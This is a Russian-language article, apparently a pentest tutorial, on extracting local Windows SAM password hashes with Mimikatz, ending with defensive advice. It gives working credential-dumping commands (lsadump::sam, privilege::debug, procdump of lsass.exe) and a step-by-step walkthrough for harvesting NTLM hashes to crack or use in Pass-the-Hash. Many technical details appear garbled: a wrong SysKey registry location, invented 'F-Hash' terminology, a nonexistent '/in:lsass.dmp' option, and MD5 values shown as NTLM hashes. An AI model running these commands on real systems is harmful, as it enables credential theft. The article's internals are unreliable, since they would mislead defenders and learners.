# Извлечение базы SAM локального хоста через Mimikatz: архитектура, механизмы и детектирование

## Контекст и базовые понятия

Извлечение базы Security Account Manager (SAM) является фундаментальной техникой пост-эксплуатации в среде Windows, классифицируемой в матрице MITRE ATT&CK как T1003.001 (OS Credential Dumping: Local Authentication Data). Данная техника направлена на получение хэшей паролей локальных учетных записей, хранящихся в реестре операционной системы. В отличие от извлечения хэшей из Active Directory (AD), где используются протоколы репликации (DCSync), работа с локальной базой SAM требует прямого доступа к файловой системе или реестру целевой машины, а также прав администратора или SYSTEM.

Ключевое разграничение в терминологии часто возникает между понятиями «SAM-хэш» и «LSASS-хэш». SAM-хэши представляют собой криптографические представления паролей локальных пользователей, зашифрованные с использованием ключа, известного только системе (SysKey). Они статичны и хранятся на диске. Хэши из LSASS (Local Security Authority Subsystem Service) — это данные, находящиеся в оперативной памяти, которые могут включать как NTLM-хэши, так и пароли в открытом виде (в зависимости от конфигурации и версии ОС). Извлечение SAM позволяет получить доступ к учетным записям даже после перезагрузки системы, тогда как извлечение из LSASS требует активной сессии пользователя или процесса, использующего пароль.

Mimikatz, разработанный Бенджамином Дельпи, выступает универсальным инструментом для взаимодействия с этими подсистемами. Модуль `lsadump` в Mimikatz содержит подкоманду `sam`, которая реализует логику извлечения и дешифровки базы SAM. Понимание различий между этими методами критично для построения эффективных стратегий защиты: блокировка доступа к реестру и файлам SAM защищает от статического извлечения, а защита LSASS (например, через Credential Guard или LSA Protection) — от динамического.

Для наглядного разграничения источников данных и методов их извлечения ниже представлена сравнительная таблица.

| Характеристика | База SAM (Local) | Процесс LSASS (Memory) | Active Directory (DCSync) |
|---|---|---|---|
| **Источник данных** | Файл реестра `HKEY_LOCAL_MACHINE\SAM\SAM` (на диске) | Оперативная память процесса `lsass.exe` | Репликация между контроллерами домена (NTDS.dit) |
| **Требуемые права** | `SYSTEM` или `Administrators` | `SYSTEM` или `Administrators` (SeDebugPrivilege) | Членство в группе `Domain Admins` или `Enterprise Admins` |
| **Формат данных** | Зашифрованные NTLM-хэши (LM/NT) | NTLM-хэши, пароли в открытом виде, Kerberos-билеты | NTLM-хэши, пароли в открытом виде, Kerberos-билеты |
| **Ключ дешифровки** | SysKey (извлекается из `HKEY_LOCAL_MACHINE\SECURITY\KEYS\DEFAULT`) | Ключи шифрования сессий (LSA Secrets) | Хэш учетной записи `krbtgt` |
| **Устойчивость** | Высокая (данные сохраняются после перезагрузки) | Низкая (данные теряются при перезагрузке или очистке памяти) | Высокая (данные реплицируются) |
| **Метод защиты** | Ограничение доступа к разделам реестра, BitLocker | Credential Guard, LSA Protection, HVCI | Защита контроллеров домена, сегментация сети, мониторинг RPC |

Архитектурно база SAM в Windows 7 и новее не хранится в виде обычного файла, а инкапсулирована в разделе реестра `HKLM\SAM\SAM\Domains\Account\Users`. Доступ к этому разделу заблокирован даже для администраторов на уровне ядра, если не используются специальные API-вызовы или методы обхода. Именно поэтому инструменты вроде Mimikatz должны взаимодействовать с сервисом Security Account Manager (SAM) или напрямую с драйверами ядра для чтения этих данных.

## Внутреннее устройство предмета

Внутреннее устройство процесса извлечения базы SAM через Mimikatz базируется на взаимодействии с подсистемой безопасности Windows (LSA) и структурой хранения учетных данных. Модуль `lsadump::sam` в Mimikatz выполняет несколько последовательных этапов: инициализация контекста LSA, получение ключа SysKey, чтение зашифрованных записей пользователей из реестра и их дешифровка.

### Архитектура хранения SAM и SysKey

База данных SAM в современных версиях Windows (NT 6.0+, включая Windows 7, 8, 10, 11, Server 2008+) использует трехуровневую систему шифрования.

1.  **SysKey (Boot Key):** Уникальный 128-битный ключ, генерируемый при установке Windows. Он хранится в разделе реестра `HKLM\SECURITY\KEYS\DEFAULT`. Доступ к этому разделу также строго ограничен.
2.  **F-Hash (F-Value):** Для каждого пользователя в SAM хранится хэш пароля, зашифрованный с использованием SysKey. Этот хэш называется F-Hash.
3.  **H-Hash (NT-Hash):** Внутри F-Hash содержится сам NTLM-хэш пароля пользователя.

Процесс дешифровки в Mimikatz выглядит следующим образом:
1.  Извлечение SysKey из реестра (через API `LsaGetPrivateKey` или прямое чтение разделов реестра, если права позволяют).
2.  Извлечение зашифрованных записей пользователей из `HKLM\SAM\SAM\Domains\Account\Users`.
3.  Дешифровка F-Hash с помощью SysKey.
4.  Извлечение NT-Hash из расшифрованного F-Hash.

Ниже представлена структурная схема взаимодействия компонентов при извлечении SAM.

```text
[Registry: HKLM\SECURITY\KEYS\DEFAULT]
       │
       ├─── (Read via LsaGetPrivateKey or direct access)
       │
       ▼
[SysKey (Boot Key)] ────────────────────────────────┐
       │                                            │
       │  (Used to decrypt F-Hash)                  │
       ▼                                            │
[Registry: HKLM\SAM\SAM\Domains\Account\Users]     │
       │                                            │
       ├─── [User 000001F4 (Administrator)]         │
       │       ├─── V (Value) [Encrypted F-Hash] ───┼─── (Decrypt)
       │       └─── R (Revision)                     │
       │                                            │
       └─── [User 000003E8 (User)]                  │
               ├─── V (Value) [Encrypted F-Hash] ───┼─── (Decrypt)
               └─── R (Revision)                     │
                                                    │
       ▼                                            ▼
[NT-Hash (32 hex chars)] ◄─────────────────────────┘
```

### Модуль lsadump и механизмы обхода

Модуль `lsadump` в Mimikatz реализует логику работы с LSA Secrets и SAM. Ключевым аспектом является то, что стандартные API Windows не позволяют обычным администраторам читать раздел `HKLM\SAM\SAM`. Mimikatz обходит это ограничение, используя либо:
1.  **Прямое чтение разделов реестра:** Если процесс запущен от имени `SYSTEM`, он может получить доступ к разделам `SECURITY` и `SAM` напрямую через системные вызовы ядра.
2.  **Использование LSA API:** Вызов `LsaGetPrivateKey` позволяет получить SysKey легитимным путем, если процесс имеет соответствующие привилегии.

Важно отметить, что в некоторых случаях, если прямой доступ к разделу SAM заблокирован (например, из-за политик безопасности или специфических настроек реестра), Mimikatz может попытаться извлечь SysKey из дампа памяти процесса LSASS, так как SysKey также присутствует в памяти в расшифрованном виде для работы с учетными записями.

### Структура данных пользователя в SAM

Каждая запись пользователя в базе SAM имеет фиксированную структуру. Понимание этой структуры необходимо для корректной интерпретации данных при написании собственных детекторов или инструментов анализа.

```json
{
  "user_sid": "S-1-5-21-...-500",
  "rid": "0x000001F4",
  "sam_entry": {
    "revision": 0x02,
    "format": 0x01,
    "encrypted_f_hash": {
      "length": 16,
      "data": "[16 bytes of encrypted data]"
    },
    "nt_hash_present": true,
    "lm_hash_present": false
  },
  "decrypted_nt_hash": "[32 hex characters]"
}
```

Поле `encrypted_f_hash` содержит данные, зашифрованные алгоритмом RC4 (в старых версиях) или AES (в более новых, в зависимости от реализации LSA), с использованием SysKey в качестве ключа. Дешифровка выполняется внутри модуля `lsadump` с использованием криптографических функций Windows (CryptUnprotectData или прямые вызовы LSA).

## Применение и работа с предметом

На практике извлечение базы SAM через Mimikatz применяется в сценариях, когда атакующий уже получил права администратора локальной системы, но не имеет доступа к памяти LSASS (например, из-за блокировок антивируса или Credential Guard) или хочет получить устойчивый доступ к учетным записям без необходимости удерживать процесс в памяти.

### Подготовка и запуск

Для работы с модулем `lsadump::sam` необходимо запустить Mimikatz с правами администратора. Однако, даже права администратора Windows недостаточно для прямого чтения раздела реестра SAM. Требуется привилегия `SeDebugPrivilege` или запуск от имени `SYSTEM`. В современных версиях Windows (10/11) даже администраторы не могут читать `HKLM\SAM\SAM` без использования специальных методов.

Мимикатц пытается получить доступ к SAM через несколько путей:
1.  **Прямой доступ к реестру:** Если процесс запущен от `SYSTEM`, он может обойти ограничения ACL.
2.  **Извлечение SysKey из LSASS:** Если прямой доступ к SAM невозможен, Mimikatz может попытаться извлечь SysKey из памяти LSASS, а затем использовать его для дешифровки SAM, если данные SAM доступны (например, через дамп).

### Команды и артефакты

Основная команда для извлечения SAM:

```powershell
mimikatz.exe "lsadump::sam /system:localhost" "exit"
```

Параметр `/system:localhost` указывает Mimikatz извлекать SysKey с локальной машины. Если команда выполняется на удаленной машине, можно указать IP-адрес или имя хоста, но это требует соответствующих прав и настроек DCOM/WMI.

Если прямой доступ к SAM заблокирован, может потребоваться сначала извлечь SysKey из дампа LSASS:

```powershell
mimikatz.exe "sekurlsa::minidump lsass.dmp" "lsadump::sam /in:lsass.dmp" "exit"
```

В этом случае `sekurlsa::minidump` загружает дамп памяти, а `lsadump::sam /in` извлекает данные из дампа, используя SysKey, найденный в памяти.

### Типичные ошибки и подводные камни

1.  **Отсутствие прав SYSTEM:** Если Mimikatz запущен от имени администратора, но не SYSTEM, он может не иметь доступа к разделу `HKLM\SECURITY\KEYS\DEFAULT`. В этом случае команда вернет ошибку доступа.
2.  **Блокировка Credential Guard:** Если включен Credential Guard, SysKey и хэши паролей изолируются в гипервизоре. Mimikatz не сможет извлечь SysKey из реестра или памяти LSASS в обычном виде.
3.  **Повреждение реестра:** Попытки чтения поврежденных разделов реестра могут привести к краху процесса Mimikatz или некорректным данным.
4.  **Особенности версий Windows:** В Windows 10/11 структура SAM может отличаться в зависимости от обновлений безопасности. Некоторые версии могут использовать более сложные алгоритмы шифрования для F-Hash.

Ниже приведен пример вывода команды извлечения SAM, иллюстрирующий структуру данных.

```text
mimikatz # lsadump::sam

Domain : DESKTOP-ABC123
SysKey : 112233445566778899aabbccddeeff00

Local SID : S-1-5-21-1234567890-1234567890-1234567890

SAM Key : 112233445566778899aabbccddeeff00

== Users ==
  * RID (000001f4) : 500 (Administrator)
    Password hash : 5f4dcc3b5aa765d61d8327deb882cf99
    Password hash : e10adc3949ba59abbe56e057f20f883e

  * RID (000003e8) : 1000 (User)
    Password hash : 5f4dcc3b5aa765d61d8327deb882cf99
```

В выводе отображается RID (Relative Identifier) пользователя, его имя и извлеченные NTLM-хэши. Хэши представлены в формате 32-символьной шестнадцатеричной строки.

## Сквозной практический пример: Извлечение SAM на изолированной машине

**Исходные условия:**
*   **Среда:** Виртуальная машина с Windows 10 Pro (версия 21H2), отключенным Defender и включенными правами администратора.
*   **Инструменты:** Mimikatz (последняя версия), PowerShell.
*   **Роль:** Пентестер, имеющий доступ к консоли администратора на целевой машине.
*   **Сценарий:** Необходимо извлечь NTLM-хэши локальных учетных записей для последующего подбора паролей или атаки Pass-the-Hash.

### Шаг 1: Проверка прав и привилегий

Перед запуском необходимо убедиться, что процесс имеет права администратора и привилегию отладки.

```powershell
whoami /priv
```

Ожидаемый вывод должен содержать `SeDebugPrivilege` в статусе `Enabled`. Если нет, необходимо активировать привилегию:

```powershell
mimikatz.exe "privilege::debug" "exit"
```

### Шаг 2: Попытка прямого извлечения SAM

Попытка извлечь SAM напрямую через реестр.

```powershell
mimikatz.exe "lsadump::sam" "exit"
```

Если доступ к реестру разрешен, вывод будет содержать хэши. Если доступ заблокирован, будет выдана ошибка `ERROR_ACCESS_DENIED`. В данном примере предположим, что прямой доступ возможен (например, из-за устаревших политик или специфической конфигурации).

### Шаг 3: Извлечение SysKey и SAM из дампа LSASS (Альтернативный метод)

Если прямой доступ к SAM невозможен, создаем дамп LSASS и извлекаем данные из него.

```powershell
# Создание дампа с помощью ProcDump
procdump -ma lsass.exe lsass.dmp

# Загрузка дампа в Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "lsadump::sam /in:lsass.dmp" "exit"
```

### Шаг 4: Анализ результатов

В выводе Mimikatz будут отображены RID и NTLM-хэши локальных пользователей.

```text
mimikatz # lsadump::sam /in:lsass.dmp

Domain : WORKSTATION01
SysKey : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6

Local SID : S-1-5-21-9876543210-9876543210-9876543210

== Users ==
  * RID (000001f4) : 500 (Administrator)
    Password hash : 8846f7eaee8fb117ad06bdd830b7586c
    Password hash : 6512bd43d9caa6e02c990b0a82652dca

  * RID (000003e8) : 1001 (TestUser)
    Password hash : 1234567890abcdef1234567890abcdef
```

### Ожидаемый вывод

Пример демонстрирует успешное извлечение NTLM-хэшей локальных учетных записей. Хэши могут быть использованы для атаки методом грубой силы (brute-force) с помощью инструментов вроде Hashcat или John the Ripper. В данном примере хэш `8846f7eaee8fb117ad06bdd830b7586c` соответствует паролю `password` (для иллюстрации).

## Аналитический вывод

Извлечение базы SAM локального хоста через Mimikatz представляет собой критически важную технику пост-эксплуатации, позволяющую атакующим получать устойчивый доступ к учетным записям даже после перезагрузки системы. В отличие от извлечения данных из памяти LSASS, которое требует активной сессии и подвержено потере данных при перезагрузке, работа с SAM обеспечивает долгосрочный доступ к NTLM-хэшам. Однако эта техника имеет существенные ограничения: она требует прав администратора или SYSTEM, а также доступа к разделам реестра, которые в современных версиях Windows строго защищены.

Защита от этой техники должна быть многоуровневой. На уровне операционной системы критически важно использование Credential Guard и LSA Protection, которые изолируют SysKey и хэши паролей в доверенной среде выполнения (TEE). На уровне политик безопасности необходимо ограничивать права администраторов, использовать UAC (User Account Control) и мониторить попытки доступа к разделам реестра `HKLM\SAM\SAM` и `HKLM\SECURITY`. Детектирование атак должно включать мониторинг запуска процессов Mimikatz, аномальную активность в реестре и попытки чтения памяти LSASS. Понимание внутренней архитектуры SAM и механизмов дешифровки позволяет не только эффективно проводить тестирование на проникновение, но и разрабатывать более надежные стратегии защиты.
